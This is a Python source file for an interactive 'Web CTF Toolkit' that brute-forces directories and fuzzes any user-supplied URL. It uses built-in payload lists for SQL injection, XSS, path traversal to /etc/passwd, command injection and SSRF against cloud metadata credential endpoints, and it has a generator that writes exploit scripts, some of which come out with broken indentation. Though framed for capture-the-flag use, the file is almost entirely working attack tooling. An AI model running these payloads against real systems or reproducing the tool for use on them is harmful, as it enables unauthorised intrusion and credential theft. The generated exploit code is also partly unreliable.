import requests
import threading
from queue import Queue
import os
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

# ----------------- Colors -----------------
class bcolors:
    OK = '\033[92m'
    WARN = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# ----------------- Global vars -----------------
session = requests.Session()
target = ""
found_dirs = []
payload_placeholder = "FUZZ"

# Built-in small wordlists
DIR_WORDLIST = ["admin", "login", "config", "backup", "test", "uploads", "phpinfo.php", "index.php.bak", 
                "robots.txt", "sitemap.xml", ".git", "wp-admin", "administrator", "dashboard", "api", "js", "css"]

PARAM_WORDLIST = ["id", "page", "file", "dir", "path", "url", "redirect", "next", "cmd", "command", "exec", "query"]

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1-- -", "admin'--", "' UNION SELECT NULL-- -",
    "' OR SLEEP(5)-- -", "1' AND (SELECT 1 FROM (SELECT SLEEP(10))A)-- -"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "'><script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>", "javascript:alert(1)"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../../windows/win.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php"
]

CMD_PAYLOADS = [
    ";id", "|id", "&id", "&&id", ";whoami", "|whoami", ";cat /etc/passwd", "`id`"
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "file:///etc/passwd",
    "http://burpcollaborator.oastify.com"
]

# ----------------- Helper functions -----------------
def banner():
    print(f"""{bcolors.OK}
  __        __     _            ____ _____ _____    _____ _    _ 
  \ \      / /   _| |__   ___  / ___|_   _|_   _|  / ____| |  | |
   \ \ /\ / /_ _ | '_ \ / __| \___ \ | |   | |   | |    | |__| |
    \ V  V /|_| | |_) | (__   ___) | | |   | |   | |    |  __  |
     \_/\_/     |_.__/ \___| |____/  |_|   |_|   |_____|_|  |_|  v1.0
{bcolors.ENDC}           Interactive Web CTF Toolkit - From recon to pwn
    """)

def set_target():
    global target
    target = input(f"{bcolors.WARN}[*] Enter target (e.g. http://ctf.example.com/): {bcolors.ENDC}").strip()
    if not target.endswith("/"):
        target += "/"
    print(f"{bcolors.OK}[+] Target set to {target}{bcolors.ENDC}")

def set_headers():
    ua = input("[*] User-Agent (leave empty for default): ").strip()
    if ua:
        session.headers.update({"User-Agent": ua})
    extra = input("[*] Extra headers (key:value; key2:value2) or empty: ").strip()
    if extra:
        for h in extra.split(";"):
            if ":" in h:
                k, v = h.split(":", 1)
                session.headers.update({k.strip(): v.strip()})

def set_cookies():
    cookies = input("[*] Cookies (key=value; key2=value2) or empty: ").strip()
    if cookies:
        ck = {}
        for c in cookies.split(";"):
            if "=" in c:
                k, v = c.strip().split("=", 1)
                ck[k] = v
        session.cookies.update(ck)

def set_proxy():
    proxy = input("[*] Proxy (http://127.0.0.1:8080) or empty: ").strip()
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})

# ----------------- Brute force -----------------
def dir_bruteforce():
    if not target:
        print(f"{bcolors.FAIL}[-] Set target first!{bcolors.ENDC}")
        return
    
    wordlist_path = input("[*] Wordlist path (or 'default'): ").strip()
    if wordlist_path == "default" or not wordlist_path:
        words = DIR_WORDLIST
    else:
        with open(wordlist_path) as f:
            words = [l.strip() for l in f if l.strip()]

    exts = input("[*] Extensions (.php,.bak,.txt) or empty: ").strip()
    extensions = [""] + [e.strip() for e in exts.replace(".", "").split(",") if e] if exts else [""]

    threads = int(input("[*] Threads (default 20): ") or 20)

    q = Queue()
    for word in words:
        for ext in extensions:
            path = word + (f".{ext}" if ext else "")
            q.put(path + "/" if not ext else path)

    lock = threading.Lock()
    def worker():
        while True:
            try:
                path = q.get(timeout=1)
            except:
                break
            url = urljoin(target, path)
            try:
                r = session.head(url, allow_redirects=True, timeout=7)
                if r.status_code in [200, 301, 302, 403]:
                    with lock:
                        status = "FOUND" if r.status_code == 200 else r.status_code
                        print(f"{bcolors.OK}[+] {status} {url}{bcolors.ENDC}")
                        found_dirs.append(url)
            except:
                pass
            q.task_done()

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
    q.join()
    print(f"{bcolors.OK}[+] Directory brute-force finished.{bcolors.ENDC}")

# ----------------- Generic fuzzer -----------------
def generic_fuzzer(payloads, description):
    url = input(f"[*] URL containing {payload_placeholder} (e.g. http://site.com/page.php?id={payload_placeholder}): ").strip()
    threads = int(input("[*] Threads (default 10): ") or 10)
    
    q = Queue()
    for p in payloads:
        q.put(p)

    def worker():
        while True:
            try:
                payload = q.get(timeout=1)
            except:
                break
            test_url = url.replace(payload_placeholder, payload)
            try:
                r = session.get(test_url, timeout=10)
                if any(x in r.text.lower() for x in ["sql", "syntax", "mysql", "ora-", "warning"]):
                    print(f"{bcolors.FAIL}[!!] POSSIBLE VULN ({description}): {payload} => {test_url}{bcolors.ENDC}")
                elif r.status_code == 200 and len(r.text) > 1000:
                    print(f"{bcolors.OK}[+] Interesting response ({description}): {payload}{bcolors.ENDC}")
            except:
                pass
            q.task_done()

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
    q.join()

# ----------------- Exploit code generator -----------------
def generate_exploit():
    print(f"{bcolors.WARN}[*] Exploit Code Generator{bcolors.ENDC}")
    vuln = input("""Choose vulnerability:
    1. SQL Injection
    2. XSS (Reflected)
    3. LFI
    4. Command Injection
    5. SSRF
    > """).strip()

    url = input("[*] Vulnerable URL (with FUZZ if needed): ").strip()
    param = input("[*] Vulnerable parameter (or leave empty): ").strip()

    code = "# Generated exploit - modify as needed\n"
    code += "import requests\n\n"
    code += f"url = \"{url}\"\n"
    
    if vuln == "1":
        code += "# SQLi payloads\npayloads = [\"' OR '1'='1'-- -\", \"' UNION SELECT database()-- -\"]\n"
        code += "for p in payloads:\n    params = {'" + param + "': p}\n    r = requests.get(url, params=params)\n    print(r.text)\n"
    elif vuln == "2":
        code += "payload = \"<script>alert('XSS')</script>\"\n"
        code += "params = {'" + param + "': payload}\n    r = requests.get(url, params=params)\n    print(r.text)\n"
    elif vuln == "3":
        code += "payload = \"../../../../etc/passwd\"\n"
        code += "params = {'" + param + "': payload}\n    r = requests.get(url, params=params)\n    print(r.text)\n"
    elif vuln == "4":
        code += "payload = \"; cat /flag.txt\"\n"
        code += "params = {'" + param + "': payload}\n    r = requests.get(url, params=params)\n    print(r.text)\n"
    elif vuln == "5":
        code += "payload = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n"
        code += "params = {'" + param + "': payload}\n    r = requests.get(url, params=params)\n    print(r.text)\n"

    filename = f"exploit_{vuln}.py"
    with open(filename, "w") as f:
        f.write(code)
    print(f"{bcolors.OK}[+] Exploit saved to {filename}{bcolors.ENDC}")

# ----------------- Main menu -----------------
def main():
    banner()
    while True:
        print(f"""
{bcolors.BOLD}Main Menu{bcolors.ENDC}
1. Set Target URL
2. Set Headers / User-Agent
3. Set Cookies
4. Set Proxy
5. Directory / File Brute-force
6. Parameter Discovery (GET)
7. SQL Injection Fuzzer
8. XSS Fuzzer
9. LFI Fuzzer
10. Command Injection Fuzzer
11. SSRF Fuzzer
12. Generate Exploit Code
13. Exit
        """)
        choice = input(f"{bcolors.WARN}> {bcolors.ENDC}").strip()

        if choice == "1": set_target()
        elif choice == "2": set_headers()
        elif choice == "3": set_cookies()
        elif choice == "4": set_proxy()
        elif choice == "5": dir_bruteforce()
        elif choice == "6":
            base = input("[*] Base URL (e.g. http://site.com/test.php?): ").strip()
            # Simple param discovery using PARAM_WORDLIST
            for p in PARAM_WORDLIST:
                test = f"{base}{p}=test123"
                r = session.get(test)
                if "test123" in r.text:
                    print(f"{bcolors.OK}[+] Possible parameter: {p}{bcolors.ENDC}")
        elif choice == "7": generic_fuzzer(SQLI_PAYLOADS, "SQLi")
        elif choice == "8": generic_fuzzer(XSS_PAYLOADS, "XSS")
        elif choice == "9": generic_fuzzer(LFI_PAYLOADS, "LFI")
        elif choice == "10": generic_fuzzer(CMD_PAYLOADS, "RCE")
        elif choice == "11": generic_fuzzer(SSRF_PAYLOADS, "SSRF")
        elif choice == "12": generate_exploit()
        elif choice == "13":
            print(f"{bcolors.OK}Goodbye!{bcolors.ENDC}")
            break
        else:
            print(f"{bcolors.FAIL}Invalid choice{bcolors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARN}Exited by user.{bcolors.ENDC}")
        sys.exit(0)